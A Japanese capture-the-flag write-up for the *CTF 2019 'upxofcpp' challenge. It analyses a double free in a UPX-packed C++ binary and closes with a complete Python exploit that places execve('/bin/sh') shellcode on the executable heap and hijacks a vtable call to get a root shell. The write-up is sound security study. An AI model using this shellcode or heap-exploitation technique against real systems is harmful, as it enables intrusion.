# [pwn 377pts] upxofcpp - *CTF 2019
64ビットバイナリで、UPX圧縮されています。
```
$ checksec -f upxofcpp.org
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
No RELRO        No canary found   NX disabled   DSO             No RPATH   No RUNPATH   No Symbols      No	0		0	upxofcpp.org
```
とりあえず展開して解析していきます。
C++製でよく分かりませんが、とりあえずremoveでdouble freeがあります。

addのmallocはそのままです。
```c
malloc(size * sizeof(int));
```

removeの処理はこんな感じです。
```c
if (vec_list[index]) {
   if (vec_list[index]->vtable[1] == loc_1DD0) {
      call vec_list[index]->vtable[1];
   } else {
     free(vec_list[index]->array);
   }
}
```

showはこんな感じです。
```c
if (vec_list[index]) {
   if (vec_list[index]->vtable[2] == loc_1E20) {
      std::cout << "No leakage! :P" << std::endl;
   } else {
     call vec_list[index]->vtable[2];
   }
}
```

UPX圧縮されたバイナリは実行するとヒープからスタックまでrwx領域で埋め尽くされるので、何かのはずみでshellcodeが実行できるかもしれません。
とりあえずshowでshellcodeへジャンプするためにvec_list[index]->vtable[2]を書き換えることを目標にしましょう。

確保された領域はこんな感じになってるのかな？
```c
typedef struct {
    void **vtable;
    int *array;
} VECTOR;
```

double freeで死ぬのはリンクがNULLになっているからで、そうでなければ参照された場所に書かれているアドレスにジャンプするはずです。
例えばadd-->remove-->removeでは
```
[22838.236960] upxofcpp.org[26231]: segfault at 8 ip 00007f4228d396da sp 00007ffd74454f60 error 4
[22838.236965] Code: 00 e8 5a f7 ff ff 48 63 44 24 04 83 f8 0f 77 50 48 8d 15 59 1c 20 00 48 8b 1c c2 48 85 db 74 40 48 8b 03 48 8d 15 f6 06 00 00 <48> 8b 40 08 48 39 d0 75 3d 48 8b 7b 08 e8 d4 f6 ff ff 48 89 df e8
```
add-->remove-->showでは
```
[22849.809113] upxofcpp.org[26235]: segfault at 10 ip 00007fd2f0b5185e sp 00007fff05fed9a0 error 4
[22849.809118] Code: ff ff 48 63 44 24 04 83 f8 0f 0f 87 84 00 00 00 48 8d 15 d5 1a 20 00 48 8b 3c c2 48 85 ff 74 74 48 8b 07 48 8d 15 c2 05 00 00 <48> 8b 40 10 48 39 d0 0f 85 ad 00 00 00 48 8d 35 05 07 00 00 48 8d
```
となります。
一方、add-->add-->remove-->remove-->showでは
```
[22936.797990] upxofcpp.org[26253]: segfault at 8 ip 0000000000000008 sp 00007ffededbe0d8 error 14
[22936.797995] Code: Bad RIP value.
```
となり、とりあえずRIPが取れていることが分かります。

C++は読めないのでgdbで確認してみます。
index=0と1に8個の整数を確保し、0をfreeする直前は次のようになっています。
```
0x555555769e60:	0x0000000000000000	0x0000000000000021
0x555555769e70:	0x0000555555756db8	0x0000555555769e90
0x555555769e80:	0x0000000000000008	0x0000000000000031
0x555555769e90:	0x0000000000000000	0x0000000000000000
0x555555769ea0:	0x0000000000000000	0x0000000000000000
0x555555769eb0:	0x0000000000000000	0x0000000000000021
0x555555769ec0:	0x0000555555756db8	0x0000555555769ee0
0x555555769ed0:	0x0000000000000008	0x0000000000000031
0x555555769ee0:	0x0000000200000001	0x0000000400000003
0x555555769ef0:	0x0000000000000005	0x0000000000000000
0x555555769f00:	0x0000000000000000	0x000000000000f101
```
ということで、次のようになっていることが分かります。
```c
typedef struct {
    void **vtable;
    int *array;
    int size;
} VECTOR;
```
また、vtableの指す先には確かに関数があります。
```
pwndbg> x/4xg 0x0000555555756db8
0x555555756db8:	0x0000555555555d90	0x0000555555555dd0
0x555555756dc8:	0x0000555555555e20	0x00007ffff7dc67f8
pwndbg> x/4i 0x0000555555555d90
   0x555555555d90:	sub    rsp,0x18
   0x555555555d94:	mov    rax,QWORD PTR fs:0x28
   0x555555555d9d:	mov    QWORD PTR [rsp+0x8],rax
   0x555555555da2:	xor    eax,eax
```

さらに、removeが終わるとvtableがNULLに変わっており、tcacheにポインタが格納されています。(※libcは2.23なので実際にはfastbinであることに注意)
```
pwndbg> x/32xg 0x555555769e60
0x555555769e60:	0x0000000000000000	0x0000000000000021
0x555555769e70:	0x0000000000000000	0x0000555555769e90
0x555555769e80:	0x0000000000000008	0x0000000000000031
0x555555769e90:	0x0000000000000000	0x0000000000000000
0x555555769ea0:	0x0000000000000000	0x0000000000000000
0x555555769eb0:	0x0000000000000000	0x0000000000000021
0x555555769ec0:	0x0000555555756db8	0x0000555555769ee0
0x555555769ed0:	0x0000000000000008	0x0000000000000031
0x555555769ee0:	0x0000000200000001	0x0000000400000003
0x555555769ef0:	0x0000000000000005	0x0000000000000000
0x555555769f00:	0x0000000000000000	0x000000000000f101
pwndbg> tcache
{
  counts = "\001\001", '\000' <repeats 61 times>, 
  entries = {0x555555769e70, 0x555555769e90, 0x0 <repeats 62 times>}
}
```

また、freeされたvectorをshowしようとすると次のようにNULLになったvtableを参照しようとしていることが分かります。
```
   0x555555555854    mov    rax, qword ptr [rdi]
 ► 0x555555555857    lea    rdx, [rip + 0x5c2]
   0x55555555585e    mov    rax, qword ptr [rax + 0x10]
   0x555555555862    cmp    rax, rdx
...
pwndbg> x/4xg $rdi
0x555555769e70:	0x0000000000000000	0x0000555555769e90
0x555555769e80:	0x0000000000000008	0x0000000000000031
```

前に別のチャンクがfreeされていればここにはヒープのアドレスが記載され、そのアドレス+0x10が参照されることになります。
上の例はtcacheなのでイメージしにくいですが、fastbinではアドレス-0x10がリンクされるので、最終的にはmallocされた場所が参照されます。
ここで、さらに前のチャンクがfreeされていれば`[rax + 0x10]`はそのfreeされたチャンクのアドレスになります。

整理すると、次のようになります。
```
(1)3つmalloc
v1 | vtable1 | array1 |
v2 | vtable2 | array2 |
v3 | vtable3 | array3 |
(2)v3, v2, v2の順にfree
v1 | v2-0x10 | array1 |
v2 | v3-0x10 | array2 |
v3 | NULL    | array3 |
(3) show(v1)
rax <-- [rdi] == v2-0x10
rax <-- [rax+0x10] == v3-0x10
call rax == call v3-0x10
```
ということで、最初にfreeしたやつのアドレス-0x10が呼ばれます。
一見これはチャンクのヘッダに思えますが、チャンクの先頭8バイトは前のチャンクが利用できるので、そこにshellcodeを入れられます。
8バイトのshellcodeは作れないので、別の場所に用意したshellcodeにジャンプする必要があります。

まずはこのコードを動かしてみましょう。
古いlibcはロードできなかったのでdockerを立てました。
```python
from ptrlib import *

def add_vec(index, size, array):
    sock.recvuntil("Your choice:")
    sock.sendline("1")
    sock.recvuntil("Index:")
    sock.sendline(str(index))
    sock.recvuntil("Size:")
    sock.sendline(str(size))
    sock.recvuntil("stop:")
    sock.sendline(' '.join(list(map(str, array))))

def remove_vec(index):
    sock.recvuntil("Your choice:")
    sock.sendline("2")
    sock.recvuntil("index:")
    sock.sendline(str(index))

def show_vec(index):
    sock.recvuntil("Your choice:")
    sock.sendline("4")
    sock.recvuntil("index:")
    sock.sendline(str(index))

sock = Socket("localhost", 9999)
    
add_vec(0, 10, [-1])
add_vec(1, 10, [0, 0, 0, 0, 0, 0, 0, 0, 0x55cccccc, -1])
add_vec(2, 10, [-1])
remove_vec(2)
remove_vec(1)
remove_vec(0)

_ = input()
show_vec(0)
```

お、何か上手くいってるっぽい。
```
root@c593f3ed8e10:~# dmesg | tail
[30523.084953] device veth9968788 entered promiscuous mode
[30523.085030] IPv6: ADDRCONF(NETDEV_UP): veth9968788: link is not ready
[30523.085031] br-ea5db204dc76: port 1(veth9968788) entered blocking state
[30523.085033] br-ea5db204dc76: port 1(veth9968788) entered forwarding state
[30523.086000] br-ea5db204dc76: port 1(veth9968788) entered disabled state
[30524.684082] eth0: renamed from veth363bb9b
[30524.711675] IPv6: ADDRCONF(NETDEV_CHANGE): veth9968788: link becomes ready
[30524.711801] br-ea5db204dc76: port 1(veth9968788) entered blocking state
[30524.711805] br-ea5db204dc76: port 1(veth9968788) entered forwarding state
[31191.672665] traps: upxofcpp.org[925] trap int3 ip:7feec87f4cb1 sp:7fffe2d631f8 error:0
```

確かにヒープ上で死んでます。
```
Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007f3853095cb1 in ?? ()
(gdb) x/32i $rip
=> 0x7f3853095cb1:	int3
...
(gdb) x/32xg 0x7f3853095c00
0x7f3853095c00:	0x0000000000000000	0x0000000000000000
0x7f3853095c10:	0x0000000000000000	0x0000000000000021
0x7f3853095c20:	0x00007f3853095c60	0x00007f3853095c40
0x7f3853095c30:	0x000000000000000a	0x0000000000000031
0x7f3853095c40:	0x00007f3853095c80	0x0000000000000000
0x7f3853095c50:	0x0000000000000000	0x0000000000000000
0x7f3853095c60:	0x0000000000000000	0x0000000000000021
0x7f3853095c70:	0x00007f3853095cb0	0x00007f3853095c90
0x7f3853095c80:	0x000000000000000a	0x0000000000000031
0x7f3853095c90:	0x00007f3853095cd0	0x0000000000000000
0x7f3853095ca0:	0x0000000000000000	0x0000000000000000
0x7f3853095cb0:	0x0000000055cccccc	0x0000000000000021
0x7f3853095cc0:	0x0000000000000000	0x00007f3853095ce0
0x7f3853095cd0:	0x000000000000000a	0x0000000000000031
0x7f3853095ce0:	0x0000000000000000	0x0000000000000000
0x7f3853095cf0:	0x0000000000000000	0x0000000000000000
```
で、そのちょっと先にindex=2のヒープを指すアドレスがあります。
これを利用して、index=2の配列へジャンプしてやればシェルコードが動かせそうです。

ここにシェルコードを入れて、jmpの前にint 3を発生させてデバッグしてみましょう。

```
Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007fdb7e7c1cb2 in ?? ()
(gdb) x/4i $rip
=> 0x7fdb7e7c1cb2:	jmp    0x7fdb7e7c1ce8
   0x7fdb7e7c1cb4:	add    %al,(%rax)
   0x7fdb7e7c1cb6:	add    %al,(%rax)
   0x7fdb7e7c1cb8:	and    %eax,(%rax)
(gdb) x/16i 0x7fdb7e7c1ce8
   0x7fdb7e7c1ce8:	nop
   0x7fdb7e7c1ce9:	nop
   0x7fdb7e7c1cea:	xor    %rax,%rax
   0x7fdb7e7c1ced:	push   %rax
   0x7fdb7e7c1cee:	xor    %rdx,%rdx
   0x7fdb7e7c1cf1:	nop
   0x7fdb7e7c1cf2:	xor    %rsi,%rsi
   0x7fdb7e7c1cf5:	movabs $0x68732f2f6e69622f,%rbx
   0x7fdb7e7c1cff:	push   %rbx
   0x7fdb7e7c1d00:	push   %rsp
   0x7fdb7e7c1d01:	pop    %rdi
   0x7fdb7e7c1d02:	mov    $0x3b,%al
   0x7fdb7e7c1d04:	syscall 
   0x7fdb7e7c1d06:	add    %al,(%rax)
   0x7fdb7e7c1d08:	add    %al,(%rax)
   0x7fdb7e7c1d0a:	add    %al,(%rax)
```
いい感じですね。
シェルコードを入れるときは各整数が0x80000000を超えないようにnopで調節してください。

```python
from ptrlib import *

def add_vec(index, size, array):
    sock.recvuntil("Your choice:")
    sock.sendline("1")
    sock.recvuntil("Index:")
    sock.sendline(str(index))
    sock.recvuntil("Size:")
    sock.sendline(str(size))
    sock.recvuntil("stop:")
    sock.sendline(' '.join(list(map(str, array))))

def remove_vec(index):
    sock.recvuntil("Your choice:")
    sock.sendline("2")
    sock.recvuntil("index:")
    sock.sendline(str(index))

def show_vec(index):
    sock.recvuntil("Your choice:")
    sock.sendline("4")
    sock.recvuntil("index:")
    sock.sendline(str(index))

sock = Socket("localhost", 9999)

shellcode  = b"\x90\x90\x48\x31"
shellcode += b"\xc0\x50\x48\x31"
shellcode += b"\xd2\x90\x48\x31"
shellcode += b"\xf6\x48\xbb\x2f"
shellcode += b"\x62\x69\x6e\x2f"
shellcode += b"\x2f\x73\x68\x53"
shellcode += b"\x54\x5f\xb0\x3b"
shellcode += b"\x0f\x05\x00\x00"
vec_shellcode = [0, 0]
for i in range(0, len(shellcode), 4):
    vec_shellcode.append(u32(shellcode[i:i+4]))
    print(hex(vec_shellcode[-1]))
    assert vec_shellcode[-1] < 0x80000000
vec_shellcode.append(-1)
print(list(map(hex, vec_shellcode)))

add_vec(0, 10, [-1])
add_vec(1, 10, [0, 0, 0, 0, 0, 0, 0, 0, 0x34eb9090, -1])
add_vec(2, 20, vec_shellcode)
remove_vec(2)
remove_vec(1)
remove_vec(0)

show_vec(0)

sock.interactive()
```

よっしゃー解けたー！！
```
$ python solve.py 
[+] Socket: Successfully connected to localhost:9999
0x31489090
0x314850c0
0x314890d2
0x2fbb48f6
0x2f6e6962
0x5368732f
0x3bb05f54
0x50f
['0x0', '0x0', '0x31489090', '0x314850c0', '0x314890d2', '0x2fbb48f6', '0x2f6e6962', '0x5368732f', '0x3bb05f54', '0x50f', '-0x1']
[ptrlib]$ whoami
root
```

# 感想
最初に見たときは難しくするためにUPX付けてると思ってましたが、UPXによりシェルコードが動くようになるんですね。
よくこんな問題思いつくなぁ......